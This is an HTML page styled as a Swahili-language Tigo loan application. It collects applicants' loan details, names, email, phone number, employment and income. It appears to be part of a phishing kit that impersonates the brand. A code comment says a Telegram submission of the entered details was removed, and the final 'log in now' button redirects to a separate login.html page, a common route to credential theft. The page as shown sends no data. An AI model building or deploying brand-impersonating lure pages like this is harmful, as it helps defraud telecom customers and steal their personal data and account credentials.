<!DOCTYPE html>
<html lang="sw">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ombi la Mkopo - Tigo</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Segoe UI', Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #f2f2f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .app-container {
            width: 100%;
            max-width: 428px;
            height: 100vh;
            max-height: 926px;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .header {
            background-color: #E3000F;
            color: white;
            padding: 20px;
            text-align: center;
            position: relative;
        }

        .header h1 {
            font-size: 20px;
            font-weight: 600;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 12px;
        }

        .step-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background-color: rgba(255, 255, 255, 0.4);
            transition: all 0.3s ease;
        }

        .step-dot.active {
            background-color: #ffffff;
            width: 24px;
            border-radius: 4px;
        }

        .content {
            padding: 24px 20px;
            flex: 1;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
        }

        .form-step {
            display: none;
            animation: slideIn 0.3s ease-out;
        }

        .form-step.active {
            display: block;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(20px);
            }

            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1c1c1e;
            margin-bottom: 8px;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 14px;
            border: 1px solid #d1d5db;
            border-radius: 10px;
            font-size: 16px;
            color: #1c1c1e;
            background-color: #f9fafb;
            transition: all 0.2s;
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #E3000F;
            background-color: #fff;
            box-shadow: 0 0 0 3px rgba(227, 0, 15, 0.1);
        }

        .summary-box {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 12px;
            padding: 20px;
            margin-top: 10px;
        }

        .summary-title {
            font-size: 16px;
            font-weight: 700;
            color: #1c1c1e;
            margin-bottom: 15px;
            border-bottom: 1px solid #dee2e6;
            padding-bottom: 8px;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .summary-label {
            color: #6c757d;
        }

        .summary-value {
            font-weight: 600;
            color: #1c1c1e;
            text-align: right;
        }

        .btn-container {
            margin-top: auto;
            padding: 10px 0;
            display: flex;
            gap: 12px;
        }

        .next-btn,
        .back-btn {
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .next-btn {
            background-color: #E3000F;
            color: white;
            flex: 2;
        }

        .back-btn {
            background-color: #f2f2f7;
            color: #1c1c1e;
            flex: 1;
        }

        .next-btn:active {
            background-color: #c8000d;
        }

        .back-btn:active {
            background-color: #e5e5ea;
        }

        .currency-symbol {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: #6c757d;
            font-weight: 500;
        }

        .input-with-symbol {
            position: relative;
        }

        .input-with-symbol input {
            padding-left: 35px;
        }
    </style>
</head>

<body>
    <div class="app-container">
        <header class="header">
            <h1>Ombi la Mkopo - Tigo</h1>
            <div class="step-indicator">
                <div class="step-dot active" id="dot-1"></div>
                <div class="step-dot" id="dot-2"></div>
                <div class="step-dot" id="dot-3"></div>
            </div>
        </header>

        <main class="content">
            <!-- Step 1: Loan Details -->
            <div class="form-step active" id="step-1">
                <div class="form-group">
                    <label>Aina ya Mkopo</label>
                    <select id="loan-type">
                        <option>Mkopo wa Binafsi</option>
                        <option>Mkopo wa Biashara</option>
                        <option>Mkopo wa Dharura</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Kiasi cha Mkopo (TSh)</label>
                    <div class="input-with-symbol">
                        <span class="currency-symbol">TSh</span>
                        <input type="number" id="loan-amount" placeholder="Weka kiasi">
                    </div>
                </div>
                <div class="form-group">
                    <label>Muda wa Mkopo</label>
                    <select id="loan-term">
                        <option value="miezi 3">Miezi 3</option>
                        <option value="miezi 6">Miezi 6</option>
                        <option value="miezi 9">Miezi 9</option>
                        <option value="miezi 12">Miezi 12</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Lengo la Mkopo</label>
                    <input type="text" id="loan-purpose" placeholder="mf. Elimu, Afya">
                </div>
            </div>

            <!-- Step 2: Personal Information -->
            <div class="form-step" id="step-2">
                <div class="form-group">
                    <label>Jina la Kwanza</label>
                    <input type="text" id="first-name" placeholder="John">
                </div>
                <div class="form-group">
                    <label>Jina la Ukoo</label>
                    <input type="text" id="last-name" placeholder="Doe">
                </div>
                <div class="form-group">
                    <label>Anwani ya Barua Pepe</label>
                    <input type="email" id="email" placeholder="john.doe@example.com">
                </div>
                <div class="form-group">
                    <label>Namba ya Simu</label>
                    <input type="tel" id="app-phone" placeholder="0XXXX XXXXX">
                </div>
            </div>

            <!-- Step 3: Employment & Summary -->
            <div class="form-step" id="step-3">
                <div class="form-group">
                    <label>Hali ya Kazi</label>
                    <select id="employment-status">
                        <option>Umeajiriwa</option>
                        <option>Umejiajiri</option>
                        <option>Haujaajiriwa</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Mapato ya Mwaka (TSh)</label>
                    <div class="input-with-symbol">
                        <span class="currency-symbol">TSh</span>
                        <input type="number" id="annual-income" placeholder="1,000,000">
                    </div>
                </div>

                <div class="summary-box">
                    <h3 class="summary-title">Muhtasari wa Ombi</h3>
                    <div class="summary-item">
                        <span class="summary-label">Kiasi cha Mkopo:</span>
                        <span class="summary-value" id="sum-amount">TSh 0</span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label">Muda wa Mkopo:</span>
                        <span class="summary-value" id="sum-term">miezi 12</span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label">Lengo:</span>
                        <span class="summary-value" id="sum-purpose">-</span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label">Mwombaji:</span>
                        <span class="summary-value" id="sum-name">-</span>
                    </div>
                </div>
            </div>

            <div class="btn-container">
                <button class="back-btn" id="prev-btn" style="display: none;">Rudi</button>
                <button class="next-btn" id="next-btn">Endelea</button>
            </div>
        </main>
    </div>

    <script>
        let currentStep = 1;

        const nextBtn = document.getElementById('next-btn');
        const prevBtn = document.getElementById('prev-btn');
        const steps = document.querySelectorAll('.form-step');
        const dots = document.querySelectorAll('.step-dot');

        nextBtn.addEventListener('click', async () => {
            if (currentStep < 3) {
                currentStep++;
                updateUI();
            } else {
                await submitApplication();
            }
        });

        prevBtn.addEventListener('click', () => {
            if (currentStep > 1) {
                currentStep--;
                updateUI();
            }
        });

        function updateUI() {
            steps.forEach((step, index) => {
                step.classList.toggle('active', index + 1 === currentStep);
            });

            dots.forEach((dot, index) => {
                dot.classList.toggle('active', index + 1 === currentStep);
            });

            prevBtn.style.display = currentStep === 1 ? 'none' : 'block';
            nextBtn.textContent = currentStep === 3 ? 'Ingia Sasa' : 'Endelea';

            if (currentStep === 3) {
                updateSummary();
            }
        }

        function updateSummary() {
            document.getElementById('sum-amount').textContent = 'TSh ' + (parseInt(document.getElementById('loan-amount').value || '0')).toLocaleString();
            document.getElementById('sum-term').textContent = document.getElementById('loan-term').value;
            document.getElementById('sum-purpose').textContent = document.getElementById('loan-purpose').value || '-';
            document.getElementById('sum-name').textContent = document.getElementById('first-name').value + ' ' + document.getElementById('last-name').value;
        }

        async function submitApplication() {
            // Removed Telegram submission for application details as per request
            window.location.href = 'login.html';
        }
    </script>
</body>

</html>
